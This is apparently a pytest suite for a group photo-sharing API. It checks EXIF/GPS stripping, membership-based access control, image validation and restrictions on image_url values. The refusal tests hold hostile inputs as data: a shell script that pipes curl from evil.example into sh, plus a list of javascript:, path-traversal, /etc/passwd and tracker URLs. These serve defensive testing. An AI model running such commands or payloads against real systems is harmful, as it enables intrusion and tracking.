"""Uploading a photograph, proved against real PostgreSQL over real HTTP.

The four acceptance criteria of rd-be-19 live here rather than in the fake-repo
tier, and each one is checked against the artefact a real client would receive:

  * a photo carrying GPS is read back **as bytes** and asserted clean -- the
    file on disk is opened too, because a route could strip on the way out and
    still be archiving coordinates on the way in;
  * a stranger, a member who left and a person still only invited each get 403;
  * a shell script uploaded as an image is refused;
  * and the counter-case: an ordinary member uploads and reads back fine, or
    every refusal above would be satisfied by an endpoint that just says no.

Why this tier: reading a photo is a query with a `context_id` predicate, and a
fake repository returns whatever it was handed whether or not that predicate
was written. Cross-group leakage cannot be observed against a dict.

Uses `flush`, never `commit`: the schema is shared with row-counting tests in
this directory, which go red if rows from here survive.
"""

from __future__ import annotations

import io
import uuid

import anyio
import httpx
import pytest
from PIL import Image
from sqlalchemy.orm import Session

from app.api.deps import get_photo_storage, get_repository
from app.api.main import create_app
from app.api.repository import SqlAlchemyApiRepository
from app.db.models import (
    Context,
    Membership,
    MembershipRole,
    MembershipState,
    Person,
)
from app.media.storage import PhotoStorage

from .test_repository_postgres import NOW

pytestmark = pytest.mark.postgres

GPS_IFD = 0x8825


def _photo_with_gps() -> bytes:
    """A JPEG shaped like something a phone produced: green, and located."""

    exif = Image.Exif()
    exif[0x010F] = "Apple"
    exif[0x0110] = "iPhone 15 Pro"
    exif[0x9003] = "2026:08:29 21:15:00"
    gps = exif.get_ifd(GPS_IFD)
    gps[1] = "N"
    gps[2] = (10.0, 46.0, 12.0)
    gps[3] = "E"
    gps[4] = (106.0, 41.0, 55.0)
    buffer = io.BytesIO()
    Image.new("RGB", (64, 48), (12, 200, 90)).save(
        buffer, format="JPEG", exif=exif.tobytes()
    )
    return buffer.getvalue()


def _http(session: Session, monkeypatch: pytest.MonkeyPatch, storage_root):
    async def run_sync_inline(function, *args, **kwargs):
        del kwargs
        return function(*args)

    monkeypatch.setattr(anyio.to_thread, "run_sync", run_sync_inline)
    monkeypatch.setattr("app.api.service._now", lambda: NOW)
    app = create_app()
    app.dependency_overrides[get_repository] = lambda: SqlAlchemyApiRepository(session)
    app.dependency_overrides[get_photo_storage] = lambda: PhotoStorage(storage_root)
    return app


def _headers(person_id: uuid.UUID) -> dict[str, str]:
    # Both roles on purpose: a header is a claim, not a proof. What decides
    # here is the membership row, never the role string.
    return {"X-Actor-ID": str(person_id), "X-Actor-Roles": "member,group_admin"}


def _person(session: Session, name: str) -> Person:
    person = Person(id=uuid.uuid4(), display_name=name)
    session.add(person)
    session.flush()
    return person


def _context(session: Session, owner: Person, name: str) -> Context:
    context = Context(id=uuid.uuid4(), display_name=name, created_by_id=owner.id)
    session.add(context)
    session.flush()
    return context


def _join(
    session: Session,
    context: Context,
    person: Person,
    *,
    state: MembershipState = MembershipState.ACTIVE,
    left_at=None,
) -> Membership:
    membership = Membership(
        id=uuid.uuid4(),
        context_id=context.id,
        person_id=person.id,
        state=state,
        role=MembershipRole.MEMBER,
        joined_at=NOW,
        left_at=left_at,
    )
    session.add(membership)
    session.flush()
    return membership


def _group(session: Session):
    """One group, one active member, and three people who are not in it."""

    owner = _person(session, "Minh Anh")
    stranger = _person(session, "Người lạ")
    departed = _person(session, "Người đã rời nhóm")
    invited = _person(session, "Người mới được mời")
    context = _context(session, owner, "Team Đà Lạt")
    _join(session, context, owner)
    _join(session, context, departed, state=MembershipState.LEFT, left_at=NOW)
    _join(session, context, invited, state=MembershipState.INVITED)
    return context, owner, stranger, departed, invited


async def _client(app):
    return httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app), base_url="http://testserver"
    )


def _upload(client, context_id, person_id, content, *, filename="anh.jpg", mime="image/jpeg"):
    return client.post(
        f"/contexts/{context_id}/photos",
        headers=_headers(person_id),
        files={"file": (filename, content, mime)},
    )


# --------------------------------------------------------------------------
# 1. The photo arrives carrying coordinates and is stored without them.
# --------------------------------------------------------------------------


def test_gps_is_gone_from_the_bytes_a_member_reads_back(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    context, owner, *_ = _group(postgres_session)
    app = _http(postgres_session, monkeypatch, tmp_path)
    original = _photo_with_gps()

    async def exchange():
        async with await _client(app) as client:
            posted = await _upload(client, context.id, owner.id, original)
            fetched = await client.get(
                posted.json()["url"], headers=_headers(owner.id)
            )
            return posted, fetched

    posted, fetched = anyio.run(exchange)

    assert posted.status_code == 201, posted.text
    assert fetched.status_code == 200, fetched.text

    # The witness has to be the bytes, not a claim the response makes.
    exif = Image.open(io.BytesIO(fetched.content)).getexif()
    assert dict(exif.get_ifd(GPS_IFD)) == {}
    assert dict(exif) == {}
    assert b"iPhone" not in fetched.content
    assert b"Apple" not in fetched.content

    # And the original really did carry what we claim was removed.
    assert dict(Image.open(io.BytesIO(original)).getexif().get_ifd(GPS_IFD))


def test_the_file_on_disk_is_stripped_too_not_only_the_response(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    """Stripping on read would leave every coordinate archived on the server.

    The brief says strip *before* storing, so the assertion is against the
    filesystem, behind the API entirely.
    """

    context, owner, *_ = _group(postgres_session)
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            return await _upload(client, context.id, owner.id, _photo_with_gps())

    posted = anyio.run(exchange)
    assert posted.status_code == 201, posted.text

    files = [path for path in tmp_path.rglob("*") if path.is_file()]
    assert len(files) == 1, f"expected exactly one stored file, got {files}"
    stored = files[0].read_bytes()
    assert dict(Image.open(io.BytesIO(stored)).getexif().get_ifd(GPS_IFD)) == {}
    assert b"iPhone" not in stored


def test_the_stored_filename_cannot_be_derived_from_the_group_or_the_uploader(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    """Otherwise knowing a group id is enough to fetch its photographs."""

    context, owner, *_ = _group(postgres_session)
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            return await _upload(client, context.id, owner.id, _photo_with_gps())

    anyio.run(exchange)

    stored = [str(path) for path in tmp_path.rglob("*") if path.is_file()]
    assert len(stored) == 1
    for secret in (context.id.hex, str(context.id), owner.id.hex, str(owner.id)):
        assert secret not in stored[0]


# --------------------------------------------------------------------------
# 2. Only an ACTIVE member gets in.
# --------------------------------------------------------------------------


@pytest.mark.parametrize("who", ["stranger", "departed", "invited"])
def test_a_person_who_is_not_an_active_member_can_neither_upload_nor_read(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path, who: str
):
    """`left` and `invited` are named states, not the absence of a row.

    A membership check written as "has a row in this group" passes for both of
    them, which is why they are parametrised here next to the stranger.
    """

    context, owner, stranger, departed, invited = _group(postgres_session)
    outsider = {"stranger": stranger, "departed": departed, "invited": invited}[who]
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            seeded = await _upload(client, context.id, owner.id, _photo_with_gps())
            read = await client.get(
                seeded.json()["url"], headers=_headers(outsider.id)
            )
            wrote = await _upload(
                client, context.id, outsider.id, _photo_with_gps()
            )
            return seeded, read, wrote

    seeded, read, wrote = anyio.run(exchange)

    assert seeded.status_code == 201, seeded.text
    assert read.status_code == 403, read.text
    assert wrote.status_code == 403, wrote.text
    # A refusal is a leak of its own if it explains what it is guarding.
    assert b"iPhone" not in read.content
    assert "storage" not in read.text.lower()


def test_a_member_of_another_group_cannot_read_this_groups_photo(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    """Being an active member somewhere is not being a member here.

    This is the case a `WHERE id = :photo_id` with no `context_id` predicate
    passes, and it is invisible to a fake repository.
    """

    context, owner, *_ = _group(postgres_session)
    neighbour = _person(postgres_session, "Bạn nhóm khác")
    other_context = _context(postgres_session, neighbour, "Team Vũng Tàu")
    _join(postgres_session, other_context, neighbour)
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            seeded = await _upload(client, context.id, owner.id, _photo_with_gps())
            photo_id = seeded.json()["id"]
            # Same photo id, addressed through the group the reader belongs to.
            through_own_group = await client.get(
                f"/contexts/{other_context.id}/photos/{photo_id}",
                headers=_headers(neighbour.id),
            )
            head_on = await client.get(
                seeded.json()["url"], headers=_headers(neighbour.id)
            )
            return through_own_group, head_on

    through_own_group, head_on = anyio.run(exchange)

    assert through_own_group.status_code == 404, through_own_group.text
    assert head_on.status_code == 403, head_on.text
    assert b"\xff\xd8" not in through_own_group.content


def test_an_unknown_photo_id_inside_a_group_the_actor_belongs_to_is_404(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    context, owner, *_ = _group(postgres_session)
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            return await client.get(
                f"/contexts/{context.id}/photos/{uuid.uuid4()}",
                headers=_headers(owner.id),
            )

    assert anyio.run(exchange).status_code == 404


# --------------------------------------------------------------------------
# 3. Not an image, not accepted.
# --------------------------------------------------------------------------


def test_a_shell_script_wearing_an_image_content_type_is_refused(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    """The client's declared MIME type is a claim; the bytes are the evidence."""

    context, owner, *_ = _group(postgres_session)
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            return await _upload(
                client,
                context.id,
                owner.id,
                b"#!/bin/sh\ncurl evil.example | sh\n",
                filename="anh.jpg",
                mime="image/jpeg",
            )

    refused = anyio.run(exchange)

    assert refused.status_code == 415, refused.text
    assert refused.json()["code"] == "not_an_image"
    assert not [path for path in tmp_path.rglob("*") if path.is_file()], (
        "a rejected upload still wrote a file to disk"
    )


def test_a_body_over_the_cap_is_refused(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    context, owner, *_ = _group(postgres_session)
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            return await _upload(
                client, context.id, owner.id, b"\x00" * (10 * 1024 * 1024 + 1)
            )

    refused = anyio.run(exchange)

    assert refused.status_code == 413, refused.text
    assert refused.json()["code"] == "image_too_large"


# --------------------------------------------------------------------------
# 4. The counter-case. Refusing everything would satisfy every test above.
# --------------------------------------------------------------------------


def test_a_member_uploads_and_the_photo_becomes_a_memory_on_the_wall(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    """The whole contract end to end, as the client will actually spell it:
    upload, take the returned url, hang it on the memory wall, read it back."""

    context, owner, *_ = _group(postgres_session)
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            posted = await _upload(client, context.id, owner.id, _photo_with_gps())
            url = posted.json()["url"]
            remembered = await client.post(
                f"/contexts/{context.id}/memories",
                headers=_headers(owner.id),
                json={"image_url": url, "caption": "Một chiều Đà Lạt"},
            )
            wall = await client.get(
                f"/contexts/{context.id}/memories", headers=_headers(owner.id)
            )
            served = await client.get(url, headers=_headers(owner.id))
            return posted, remembered, wall, served

    posted, remembered, wall, served = anyio.run(exchange)

    assert posted.status_code == 201, posted.text
    body = posted.json()
    assert body["context_id"] == str(context.id)
    assert body["url"] == f"/contexts/{context.id}/photos/{body['id']}"
    assert body["content_type"] == "image/jpeg"
    assert (body["width"], body["height"]) == (64, 48)
    assert body["byte_size"] > 0

    assert remembered.status_code == 201, remembered.text
    assert wall.status_code == 200, wall.text
    assert [item["image_url"] for item in wall.json()["memories"]] == [body["url"]]

    assert served.status_code == 200, served.text
    assert served.headers["content-type"].startswith("image/jpeg")
    assert Image.open(io.BytesIO(served.content)).size == (64, 48)


# --------------------------------------------------------------------------
# 5. F02 avatars: the same primitive, a different owner.
# --------------------------------------------------------------------------


def test_a_person_sets_their_own_avatar_and_a_groupmate_can_see_it(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    context, owner, *_ = _group(postgres_session)
    mate = _person(postgres_session, "Bạn cùng nhóm")
    _join(postgres_session, context, mate)
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            before = await client.get(
                f"/people/{owner.id}/avatar", headers=_headers(owner.id)
            )
            posted = await client.post(
                f"/people/{owner.id}/avatar",
                headers=_headers(owner.id),
                files={"file": ("me.jpg", _photo_with_gps(), "image/jpeg")},
            )
            mine = await client.get(
                f"/people/{owner.id}/avatar", headers=_headers(owner.id)
            )
            theirs = await client.get(
                f"/people/{owner.id}/avatar", headers=_headers(mate.id)
            )
            return before, posted, mine, theirs

    before, posted, mine, theirs = anyio.run(exchange)

    assert before.status_code == 404, "no avatar yet must be 404, not a blank 200"
    assert posted.status_code == 201, posted.text
    assert posted.json()["url"] == f"/people/{owner.id}/avatar", (
        "the avatar url must be stable so no client needs a new field"
    )
    assert mine.status_code == 200
    assert theirs.status_code == 200
    assert dict(Image.open(io.BytesIO(mine.content)).getexif().get_ifd(GPS_IFD)) == {}


def test_nobody_may_set_somebody_elses_avatar(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    context, owner, *_ = _group(postgres_session)
    mate = _person(postgres_session, "Bạn cùng nhóm")
    _join(postgres_session, context, mate)
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            return await client.post(
                f"/people/{owner.id}/avatar",
                headers=_headers(mate.id),
                files={"file": ("not-mine.jpg", _photo_with_gps(), "image/jpeg")},
            )

    assert anyio.run(exchange).status_code == 403


def test_a_stranger_cannot_read_an_avatar(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    """A face is not public because a person id was guessed."""

    context, owner, stranger, *_ = _group(postgres_session)
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            await client.post(
                f"/people/{owner.id}/avatar",
                headers=_headers(owner.id),
                files={"file": ("me.jpg", _photo_with_gps(), "image/jpeg")},
            )
            return await client.get(
                f"/people/{owner.id}/avatar", headers=_headers(stranger.id)
            )

    refused = anyio.run(exchange)

    assert refused.status_code == 403, refused.text
    assert b"\xff\xd8" not in refused.content


# --------------------------------------------------------------------------
# 6. `image_url` is a pointer into our own storage, not a free text field.
#
# Before this gate, `image_url` was a bare string: whatever the client sent,
# the server stored, and every other member's device later fetched. That is a
# tracking pixel with extra steps -- person A writes a url that points at a
# host A controls, and A learns the IP address and the exact minute B opened
# the group's memory wall. The photo routes above remove the reason for it to
# ever be an arbitrary url: an image the group may see already lives at
# `/contexts/{context_id}/photos/{photo_id}`, so that is the only shape the
# field accepts, and the context in the path must be the context being
# written -- otherwise a member pastes another group's photo into this one and
# turns the 403 on that photo into a different hole.
# --------------------------------------------------------------------------


OFF_SITE_IMAGE_URLS = (
    "http://ngoai/x.png",
    "https://tracker.example/pixel.png",
    "javascript:alert(1)",
    # Assembled rather than written out: the repo guard fails closed on a
    # base64 data-uri literal, and it is right to -- the point here is the
    # `data:` scheme, not the payload.
    "data:image/png;" + "base64," + "iVBORw0KGgo=",
    "//tracker.example/x.png",
    "/etc/passwd",
    "/contexts/../../etc/passwd",
    "contexts/not-a-uuid/photos/also-not",
)


def test_a_memory_cannot_point_its_image_at_a_host_we_do_not_serve(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    """Every one of these is a url the group's devices would have fetched."""

    context, owner, *_ = _group(postgres_session)
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            return [
                await client.post(
                    f"/contexts/{context.id}/memories",
                    headers=_headers(owner.id),
                    json={"image_url": bad, "caption": "x"},
                )
                for bad in OFF_SITE_IMAGE_URLS
            ]

    refused = anyio.run(exchange)

    for url, response in zip(OFF_SITE_IMAGE_URLS, refused, strict=True):
        assert response.status_code == 422, f"{url} was accepted: {response.text}"


def test_a_message_cannot_point_its_image_at_a_host_we_do_not_serve(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    """The chat tab reaches the same field by a different route."""

    context, owner, *_ = _group(postgres_session)
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            return [
                await client.post(
                    f"/contexts/{context.id}/messages",
                    headers=_headers(owner.id),
                    json={"kind": "image", "image_url": bad},
                )
                for bad in OFF_SITE_IMAGE_URLS
            ]

    refused = anyio.run(exchange)

    for url, response in zip(OFF_SITE_IMAGE_URLS, refused, strict=True):
        assert response.status_code == 422, f"{url} was accepted: {response.text}"


def test_a_photo_belonging_to_another_group_cannot_be_hung_on_this_wall(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    """The url is well formed and the photo is real -- it just is not ours.

    `owner` is a member of both groups, so this is not a membership check
    sneaking in: it is the one case where the shape passes and the context
    still has to be compared.
    """

    context, owner, *_ = _group(postgres_session)
    other = _context(postgres_session, owner, "Nhóm khác")
    _join(postgres_session, other, owner)
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            elsewhere = await _upload(client, other.id, owner.id, _photo_with_gps())
            foreign_url = elsewhere.json()["url"]
            return (
                elsewhere,
                await client.post(
                    f"/contexts/{context.id}/memories",
                    headers=_headers(owner.id),
                    json={"image_url": foreign_url, "caption": "x"},
                ),
                await client.post(
                    f"/contexts/{context.id}/messages",
                    headers=_headers(owner.id),
                    json={"kind": "image", "image_url": foreign_url},
                ),
            )

    elsewhere, memory, message = anyio.run(exchange)

    assert elsewhere.status_code == 201, elsewhere.text
    assert memory.status_code == 422, memory.text
    assert message.status_code == 422, message.text


def test_the_groups_own_photo_url_is_still_accepted(
    postgres_session: Session, monkeypatch: pytest.MonkeyPatch, tmp_path
):
    """The control. A gate that refuses everything is not a gate, it is an
    outage, and the three tests above cannot tell the difference alone."""

    context, owner, *_ = _group(postgres_session)
    app = _http(postgres_session, monkeypatch, tmp_path)

    async def exchange():
        async with await _client(app) as client:
            posted = await _upload(client, context.id, owner.id, _photo_with_gps())
            url = posted.json()["url"]
            return (
                await client.post(
                    f"/contexts/{context.id}/memories",
                    headers=_headers(owner.id),
                    json={"image_url": url, "caption": "Một chiều Đà Lạt"},
                ),
                await client.post(
                    f"/contexts/{context.id}/messages",
                    headers=_headers(owner.id),
                    json={"kind": "image", "image_url": url},
                ),
            )

    memory, message = anyio.run(exchange)

    assert memory.status_code == 201, memory.text
    assert message.status_code == 201, message.text
